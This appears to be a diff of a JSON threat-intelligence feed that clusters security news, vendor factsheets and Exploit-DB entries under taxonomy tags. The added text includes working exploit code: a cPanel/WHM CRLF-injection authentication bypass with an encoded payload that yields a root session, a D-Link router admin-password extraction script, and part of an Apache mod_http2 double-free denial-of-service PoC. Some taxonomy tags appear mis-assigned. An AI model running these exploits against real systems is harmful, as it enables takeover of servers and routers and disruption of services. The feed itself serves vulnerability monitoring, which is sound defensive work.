+        "full_body": "Rapid Response Horizon3.ai May 29, 2026 Factsheets Emerging vulnerabilities create immediate pressure for security teams. The challenge isn’t determining whether a CVE exists—it’s determining whether it can actually be exploited in your environment before attackers move faster than your remediation process. Rapid Response helps organizations quickly validate real exploitability risk for newly disclosed and actively exploited vulnerabilities. By combining Horizon3.ai Attack Team research with production-safe testing, security teams can focus on what matters, eliminate guesswork, and take action with confidence. Validate whether emerging CVEs and KEVs are actually exploitable in your environment Prioritize remediation based on confirmed exposure instead of severity scores alone Track remediation progress and verify fixes with targeted retesting Gain visibility into exploitable, potentially exposed, mitigated, and non-exploitable assets Move from disclosure to validated risk reduction faster than traditional assessment workflows Leverage Horizon3.ai Attack Team research to stay ahead of rapidly evolving threats Rapid Response helps security teams separate urgent threats from headline-grabbing vulnerabilities that may never impact their environment, enabling faster decisions and more effective use of limited remediation resources. Download the Rapid Response Factsheet to learn how Horizon3.ai helps organizations identify, prioritize, and validate emerging exploitability risk before attackers can scale exploitation.ystem. Download as PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Horizon3 Attack Research",
+          "cohort": "offensive_vulnerability_research",
+          "title": "Rapid Response",
+          "link": "https://horizon3.ai/downloads/factsheets/rapid-response/",
+          "published": "2026-05-29T16:00:00+00:00",
+          "summary": "Rapid Response enables organizations to quickly determine which emerging vulnerabilities create real exploitability risk, prioritize remediation, and verify fixes before attackers operationalize threats.",
+          "taxonomy": {
+            "threat_categories": [
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -6241,93 +6377,6 @@
       ]
     },
     {
-      "cluster_id": "787e234466",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Horizon3 Attack Research",
-        "cohort": "offensive_vulnerability_research",
-        "title": "Rapid Response",
-        "link": "https://horizon3.ai/downloads/factsheets/rapid-response/",
-        "published": "2026-05-29T16:00:00+00:00",
-        "summary": "Rapid Response enables organizations to quickly determine which emerging vulnerabilities create real exploitability risk, prioritize remediation, and verify fixes before attackers operationalize threats.",
-        "full_body": "Rapid Response Horizon3.ai May 29, 2026 Factsheets Emerging vulnerabilities create immediate pressure for security teams. The challenge isn’t determining whether a CVE exists—it’s determining whether it can actually be exploited in your environment before attackers move faster than your remediation process. Rapid Response helps organizations quickly validate real exploitability risk for newly disclosed and actively exploited vulnerabilities. By combining Horizon3.ai Attack Team research with production-safe testing, security teams can focus on what matters, eliminate guesswork, and take action with confidence. Validate whether emerging CVEs and KEVs are actually exploitable in your environment Prioritize remediation based on confirmed exposure instead of severity scores alone Track remediation progress and verify fixes with targeted retesting Gain visibility into exploitable, potentially exposed, mitigated, and non-exploitable assets Move from disclosure to validated risk reduction faster than traditional assessment workflows Leverage Horizon3.ai Attack Team research to stay ahead of rapidly evolving threats Rapid Response helps security teams separate urgent threats from headline-grabbing vulnerabilities that may never impact their environment, enabling faster decisions and more effective use of limited remediation resources. Download the Rapid Response Factsheet to learn how Horizon3.ai helps organizations identify, prioritize, and validate emerging exploitability risk before attackers can scale exploitation.ystem. Download as PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "active_exploitation"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Horizon3 Attack Research",
-          "cohort": "offensive_vulnerability_research",
-          "title": "Rapid Response",
-          "link": "https://horizon3.ai/downloads/factsheets/rapid-response/",
-          "published": "2026-05-29T16:00:00+00:00",
-          "summary": "Rapid Response enables organizations to quickly determine which emerging vulnerabilities create real exploitability risk, prioritize remediation, and verify fixes before attackers operationalize threats.",
-          "taxonomy": {
-            "threat_categories": [
-              "active_exploitation"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "72cff72e5c",
       "priority_score": 10,
       "member_count": 1,
@@ -6341,9 +6390,13 @@
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-23918"
+        ],
         "attack_techniques": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "poc_available"
+        ],
         "content_type": [
           "news_report"
         ],
@@ -6358,8 +6411,8 @@
         "link": "https://www.exploit-db.com/exploits/52577",
         "published": "2026-05-26T00:00:00+00:00",
         "summary": "Apache HTTP Server 2.4.66 - 'mod_http2' Double-Free Denial of Service",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Apache HTTP Server 2.4.66 - 'mod_http2' Double-Free Denial of Service EDB-ID: 52577 CVE: 2026-23918 EDB Verified: Author: alisunbul Type: webapps Exploit: / Platform: Multiple Date: 2026-05-26 Vulnerable App: # Exploit Title: Apache HTTP Server 2.4.66 - 'mod_http2' Double-Free Denial of Service # Google Dork: intext:\"Apache/2.4.66\" \"HTTP/2\" # Date: 2026-05-06 # Exploit Author: xeloxa (https://github.com/xeloxa/) <alisunbul@proton.me> # Vendor Homepage: https://httpd.apache.org/ # Software Link: https://archive.apache.org/dist/httpd/httpd-2.4.66.tar.gz # Version: 2.4.66 # Tested on: Debian / Ubuntu # CVE : CVE-2026-23918 \"\"\" CVE-2026-23918 - Apache mod_http2 Double-Free PoC Quick summary: This bug (CWE-415) hits Apache 2.4.66. It's a race condition in the stream cleanup path. If you spam HEADERS and RST_STREAM fast enough, you can trigger a double-free and crash the worker. Author: xeloxa (https://github.com/xeloxa/) <alisunbul@proton.me> Found by: Bartlomiej Dmitruk & Stanislaw Strzalkowski \"\"\" import argparse import json import os import signal import socket import ssl import sys import threading import time from collections import defaultdict from dataclasses import dataclass, field from datetime import datetime from typing import Dict, List, Optional, Tuple # --------------------------------------------------------------------------- # Dependency Check # --------------------------------------------------------------------------- try: import h2.config import h2.connection import h2.events HAS_H2 = True except ImportError: HAS_H2 = False # --------------------------------------------------------------------------- # ANSI Colors (for terminal output) # --------------------------------------------------------------------------- class Color: RED = \"\\033[91m\" GREEN = \"\\033[92m\" YELLOW = \"\\033[93m\" BLUE = \"\\033[94m\" MAGENTA = \"\\033[95m\" CYAN = \"\\033[96m\" BOLD = \"\\033[1m\" RESET = \"\\033[0m\" def c(text: str, color: str) -> str: \"\"\"Wrap text in color if output is a terminal.\"\"\" if sys.stdout.isatty(): return f\"{color}{text}{Color.RESET}\" return text def print_banner(title: str, color: str = Color.BOLD) -> None: \"\"\"Print a consistent tool banner with author info.\"\"\" print(f\"{'=' * 60}\") print(c(title, color)) print(f\"Author: xeloxa (https://github.com/xeloxa/)\") print(f\"{'=' * 60}\") # --------------------------------------------------------------------------- # Data Structures # --------------------------------------------------------------------------- @dataclass class ExploitStats: \"\"\"Just a thread-safe counter for the stats.\"\"\" connections: int = 0 requests: int = 0 resets: int = 0 conn_errors: int = 0 stream_errors: int = 0 crashes: int = 0 lock: threading.Lock = field(default_factory=threading.Lock) def inc(self, attr: str, delta: int = 1) -> None: with self.lock: setattr(self, attr, getattr(self, attr) + delta) def snapshot(self) -> Dict[str, int]: with self.lock: return { \"connections\": self.connections, \"requests\": self.requests, \"resets\": self.resets, \"conn_errors\": self.conn_errors, \"stream_errors\": self.stream_errors, \"crashes\": self.crashes, } # --------------------------------------------------------------------------- # SSL / HTTP/2 Connection Helpers # --------------------------------------------------------------------------- def create_ssl_context( alpn_protocols: Optional[List[str]] = None, ) -> ssl.SSLContext: \"\"\"Create an SSL context configured for HTTP/2 ALPN negotiation.\"\"\" ctx = ssl.create_default_context() ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE if alpn_protocols is None: alpn_protocols = [\"h2\"] ctx.set_alpn_protocols(alpn_protocols) return ctx def establish_h2_connection( host: str, port: int, timeout: float = 5.0, use_ssl: bool = True, ) -> Tuple[Optional[socket.socket], Optional[h2.connection.H2Connection]]: \"\"\" Sets up an H2 connection. Returns (socket, h2_connection) or (None, None)",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
             "ddos"
@@ -6368,9 +6421,13 @@
           "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-23918"
+          ],
           "attack_techniques": [],
-          "urgency_signals": [],
+          "urgency_signals": [
+            "poc_available"
+          ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
           "role_map": {},
@@ -6395,9 +6452,13 @@
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-23918"
+            ],
             "attack_techniques": [],
-            "urgency_signals": [],
+            "urgency_signals": [
+              "poc_available"
+            ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {},
@@ -6417,8 +6478,12 @@
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
+        "affected_industries": [
+          "retail_ecommerce"
+        ],
+        "affected_products": [
+          "GitHub"
+        ],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -6437,20 +6502,26 @@
         "link": "https://www.exploit-db.com/exploits/52576",
         "published": "2026-05-26T00:00:00+00:00",
         "summary": "D-Link DSL2600U - 'rom-0' Admin Password Disclosure",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training D-Link DSL2600U - 'rom-0' Admin Password Disclosure EDB-ID: 52576 CVE: N/A EDB Verified: Author: Amir Hossein Jamshidi Type: hardware Exploit: / Platform: Multiple Date: 2026-05-26 Vulnerable App: # Exploit Title: D-Link DSL2600U - 'rom-0' Admin Password Disclosure # Date: 2026-05-02 # Exploit Author: Amir Hossein Jamshidi # Vendor Homepage: https://www.dlink.com # Version: DSL-2600U # Tested on: ubuntu # CVE : N/A # Firmware Version: v1.08 from routersploit.libs.lzs.lzs import LZSDecompress import requests import re import sys print(''' ################################################################################# # D-Link Router - 'rom-0' Admin Password Disclosure # # BY: Amir Hossein Jamshidi # # Mail: amirhosseinjamshidi64@gmail.com # # github: https://github.com/amirhosseinjamshidi64 # # Usage: python expoit.py # ################################################################################# ''') def exploit(url): data = requests.get(f\"{url}/rom-0\") #with open(\"data\", 'wb') as f: # f.write(data.content) data = data.content pos = 8568 res, win = LZSDecompress(data[pos:]) password = re.findall(\"([\\040-\\176]{5,})\", res) return password[0] if __name__ == \"__main__\": url = input(\"Enter Target IP (example: http://192.168.1.1): \") print(\"password is: \" + '\\t' + exploit(url)) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
+          "affected_industries": [
+            "retail_ecommerce"
+          ],
+          "affected_products": [
+            "GitHub"
+          ],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
+          "role_map": {
+            "GitHub": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -6467,15 +6538,21 @@
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
+            "affected_industries": [
+              "retail_ecommerce"
+            ],
+            "affected_products": [
+              "GitHub"
+            ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
+            "role_map": {
+              "GitHub": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -6499,9 +6576,13 @@
           "cPanel"
         ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-41940"
+        ],
         "attack_techniques": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
         "content_type": [
           "news_report"
         ],
@@ -6516,8 +6597,8 @@
         "link": "https://www.exploit-db.com/exploits/52574",
         "published": "2026-05-26T00:00:00+00:00",
         "summary": "cPanel - CRLF Injection",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training cPanel - CRLF Injection EDB-ID: 52574 CVE: 2026-41940 EDB Verified: Author: nu11secur1ty Type: webapps Exploit: / Platform: PHP Date: 2026-05-26 Vulnerable App: # ExploitTitle: cPanel 11.40 - CRLF Injection # Author: nu11secur1tyAI # Date: 2026-04-30 # Vendor: cPanel, L.L.C. # Software: cPanel & WHM (cpsrvd) # Reference: CVE-2026-41940 / watchTowr-2026-01 ## Description: A critical authentication bypass vulnerability exists in the cPanel/WHM `cpsrvd` daemon due to improper neutralization of line delimiters (CRLF) in the `whostmgrsession` cookie and `Authorization` headers. An unauthenticated remote attacker can leverage this flaw to inject malicious session parameters directly into the server's flat-file session metadata store. By injecting sequences such as `user=root`, `hasroot=1`, and `tfa_verified=1`, the attacker subverts the internal authentication logic, forcing the system to issue a valid administrative session token (`/cpsessXXXXXXXXXX/`). This grants the attacker full `root` privileges over the WHM interface and the host operating system without requiring valid credentials. STATUS: MEDIUM - HIGH / Vulnerability [+] Payload: ```http GET / HTTP/1.1 Host: [TARGET_HOST]:2087 Authorization: Basic cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x Cookie: whostmgrsession=[PREAUTH_SESSION_ID] Connection: close ``` [+] Exploit (Python): import argparse import re import requests import urllib.parse import urllib3 # Disable SSL warnings for cleaner output urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Crafted B64 payload: # root:x\\r\\nsuccessful_internal_auth_with_timestamp=9999999999\\r\\nuser=root\\r\\ntfa_verified=1\\r\\nhasroot=1 PAYLOAD_B64 = \"cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x\" def exploit(target): s = requests.Session() s.verify = False print(f\"[*] Initializing attack on {target}...\") # Stage 1: Obtain pre-auth session base try: r = s.post(f\"{target}/login/?login_only=1\", data={\"user\": \"root\", \"pass\": \"wrong_pass\"}, allow_redirects=False, timeout=10) cookie = r.headers.get(\"Set-Cookie\", \"\") match = re.search(r\"whostmgrsession=([^;,]+)\", cookie) if not match: print(\"[-] Error: Could not retrieve whostmgrsession cookie.\") return session_base = urllib.parse.unquote(match.group(1)) print(f\"[+] Obtained session base: {session_base}\") # Stage 2: Poison session via CRLF Injection headers = { \"Authorization\": f\"Basic {PAYLOAD_B64}\", \"Cookie\": f\"whostmgrsession={urllib.parse.quote(session_base)}\", \"Connection\": \"close\" } r = s.get(f\"{target}/\", headers=headers, allow_redirects=False, timeout=10) # Stage 3: Extract leaked security token location = r.headers.get(\"Location\", \"\") token_match = re.search(r\"/cpsess\\d{10}\", location) if token_match: token = token_match.group(0) print(f\"[!] EXPLOIT SUCCESSFUL!\") print(f\"[!] Leaked Token: {token}\") print(f\"[!] Access URL: {target}{token}/\") else: print(\"[-] Exploit failed. The target may be patched or protected by a WAF.\") except Exception as e: print(f\"[-] Connection error: {e}\") if __name__ == \"__main__\": parser = argparse.ArgumentParser(description=\"cPanel/WHM CVE-2026-41940 Exploit\") parser.add_argument(\"--target\", required=True, help=\"Target URL (e.g., [https://192.168.1.1:2087](https://192.168.1.1:2087))\") args = parser.parse_args() exploit(args.target.rstrip(\"/\")) ``` [+]Reproduce: https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-41940 Time spent: 03:45:00 -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11sec",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
@@ -6526,9 +6607,13 @@
             "cPanel"
           ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-41940"
+          ],
           "attack_techniques": [],
-          "urgency_signals": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
           "role_map": {
@@ -6555,9 +6640,13 @@
               "cPanel"
             ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-41940"
+            ],
             "attack_techniques": [],
-            "urgency_signals": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {
@@ -7117,89 +7206,6 @@
             "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_3_analysis",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "35feaba3ac",
-      "priority_score": 9,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "CVE-2025-59199"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2025-59199"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "Reddit r/blueteamsec",
-        "cohort": "reddit_practitioner_osint",
-        "title": "Click Or Trick (CVE-2025-59199): Escaping the Sandbox with Windows URIs",
-        "link": "https://www.reddit.com/r/blueteamsec/comments/1tso035/click_or_trick_cve202559199_escaping_the_sandbox/",
-        "published": "2026-05-31T07:01:45+00:00",
-        "summary": "submitted by /u/digicat [link] [comments]",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2025-59199"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_5_chatter",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Reddit r/blueteamsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "Click Or Trick (CVE-2025-59199): Escaping the Sandbox with Windows URIs",
-          "link": "https://www.reddit.com/r/blueteamsec/comments/1tso035/click_or_trick_cve202559199_escaping_the_sandbox/",
-          "published": "2026-05-31T07:01:45+00:00",
-          "summary": "submitted by /u/digicat [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2025-59199"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -8071,6 +8077,138 @@
       ]
     },
     {
+      "cluster_id": "bc44a35cd9",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "credential_theft",
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [
+          "Lazarus"
+        ],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services"
+        ],
+        "affected_products": [
+          "Anthropic/Claude",
+          "GitHub",
+          "Microsoft 365"
+        ],
+        "tools_used": [
+          "npm"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "AI-Generated npm Malware Leaks Its Own GitHub Token",
+        "link": "https://www.infosecurity-magazine.com/news/ai-npm-malware-leaks-github-token/",
+        "published": "2026-05-29T08:10:00+00:00",
+        "summary": "Sloppy AI-generated npm infostealer leaked its own GitHub token, exposing the operator",
+        "full_body": "Infosecurity Magazine Home » News » AI-Generated npm Malware Leaks Its Own GitHub Token AI-Generated npm Malware Leaks Its Own GitHub Token News 29 May 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A malicious npm package has been caught leaking its own hardcoded GitHub token, a blunder that let researchers watch the operator's data theft unfold from the inside. The package, named mouse5212-super-formatter, was identified by OX Security according to new analysis from the firm's research team. It functions as an infostealer, quietly reading files from a victim's machine and uploading them to a repository the attacker controls. The package had been downloaded 676 times and remained live on npm at the time of OX Security's writeup on Wednesday, though it has since been removed. Disguised as a Sync Utility On the surface, the script presents itself as an internal \"archive deployment sync\" tool that checks a GitHub repository and records a network status snapshot. In practice, OX Security found, the post-install code authenticates to GitHub, creates a repository if one does not exist, then recursively walks a local directory and uploads every file through the GitHub Contents API. To blend in, the malware stores stolen files under a randomly named folder for each run and writes a fake \"network connections\" log so the activity resembles diagnostics rather than theft. Comments and commit messages were kept deliberately bland to avoid drawing attention. The fatal flaw was a hardcoded fallback token left in the code. Because the malware carried the operator's own GitHub credential, researchers could trace the exfiltration directly, observing around seven theft sessions in the attacker's repository, most of which appeared to be the operator testing the tool. A Sign of Sloppier Threats OX Security framed the package as an example of malware generated with AI by an operator who did not grasp basic operational security. The GitHub account behind it had been created only hours before the first upload and was deleted once the activity was exposed. The episode points to a wider shift. As the effort needed to produce working malicious code falls, researchers expect a rise in low-quality, AI-assisted malware from less skilled actors, much of it imitating more capable groups. The same dynamic was on display in VoidLink, a Linux malware strain that analysts concluded was largely AI-generated under the direction of a single person. Read more on VoidLink: Linux Malware Was Built Using an AI Agent, Researchers Reveal For defenders, the practical advice is unchanged by the attacker's incompetence. OX Security urged anyone who installed the package to revoke their GitHub access tokens and treat any sensitive files in the affected directory as compromised. You may also like Malicious npm Dependency Linked to AI Assisted Commit Targets Crypto Wallets News 29 April 2026 New Shai-Hulud Worm Spells Trouble For npm Users News 25 November 2025 “IndonesianFoods” npm Worm Publishes 44,000 Malicious Packages News 13 November 2025 Over 200 Malicious Open Source Packages Traced to Lazarus Campaign News 31 July 2025 North Korea Targets Crypto Devs Through NPM Packages News 13 February 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice India's CERT-In Sets 12-Hour Patch Deadline for Exposed Flaws News 26 May 2026 1 GCHQ Chief Urges Action as AI Reshapes Cyber Threats News 28 May 2026 2 Thousands of Fake FIFA Domains Target World Cup Fans News 27 May 2026 3 Fake Gemini and Claude Code Sites Spread Infostealers Through SEO Poisoning News 22 May 2026 4 China-Linked Webworm APT Evolves Tactics, Expands to European Targets News 20 May 2026 5 AI Raises the Bar on Vulnerability Awareness and Secure-by-Design Software News 19 May 2026 6 FBI Warns 'Kali365' Phishing Kit Hijacks Microsoft 365 OAuth Tokens News 25 May 2026 1 Cyber Resilience Under Pressure: Can Your Organisation Prove Control When it Matter",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "phishing_social_eng",
+            "credential_theft",
+            "apt_espionage"
+          ],
+          "actor_attribution": [
+            "Lazarus"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "critical_infrastructure"
+          ],
+          "affected_products": [
+            "Microsoft 365",
+            "Anthropic/Claude",
+            "GitHub"
+          ],
+          "tools_used": [
+            "npm"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Microsoft 365": "target",
+            "Anthropic/Claude": "target",
+            "GitHub": "target",
+            "Google/Gemini": "target",
+            "npm": "tool"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "AI-Generated npm Malware Leaks Its Own GitHub Token",
+          "link": "https://www.infosecurity-magazine.com/news/ai-npm-malware-leaks-github-token/",
+          "published": "2026-05-29T08:10:00+00:00",
+          "summary": "Sloppy AI-generated npm infostealer leaked its own GitHub token, exposing the operator",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng",
+              "credential_theft",
+              "apt_espionage"
+            ],
+            "actor_attribution": [
+              "Lazarus"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "critical_infrastructure"
+            ],
+            "affected_products": [
+              "Microsoft 365",
+              "Anthropic/Claude",
+              "GitHub"
+            ],
+            "tools_used": [
+              "npm"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Microsoft 365": "target",
+              "Anthropic/Claude": "target",
+              "GitHub": "target",
+              "Google/Gemini": "target",
+              "npm": "tool"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "cc80d226e9",
       "priority_score": 8,
       "member_count": 1,
@@ -8381,61 +8519,54 @@
       ]
     },
     {
-      "cluster_id": "bc44a35cd9",
+      "cluster_id": "35feaba3ac",
       "priority_score": 8,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [],
+      "strong_signals": [
+        "CVE-2025-59199"
+      ],
       "taxonomy": {
-        "threat_categories": [
-          "credential_theft"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [],
-        "tools_used": [
-          "GitHub",
-          "npm"
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2025-59199"
         ],
-        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
-          "incident_report"
+          "vulnerability_disclosure"
         ],
         "confidence_tier": [
-          "tier_4_news"
+          "tier_5_chatter"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "AI-Generated npm Malware Leaks Its Own GitHub Token",
-        "link": "https://www.infosecurity-magazine.com/news/ai-npm-malware-leaks-github-token/",
-        "published": "2026-05-29T08:10:00+00:00",
-        "summary": "Sloppy AI-generated npm infostealer leaked its own GitHub token, exposing the operator",
+        "source": "Reddit r/blueteamsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "Click Or Trick (CVE-2025-59199): Escaping the Sandbox with Windows URIs",
+        "link": "https://www.reddit.com/r/blueteamsec/comments/1tso035/click_or_trick_cve202559199_escaping_the_sandbox/",
+        "published": "2026-05-31T07:01:45+00:00",
+        "summary": "submitted by /u/digicat [link] [comments]",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [
-            "credential_theft"
-          ],
+          "threat_categories": [],
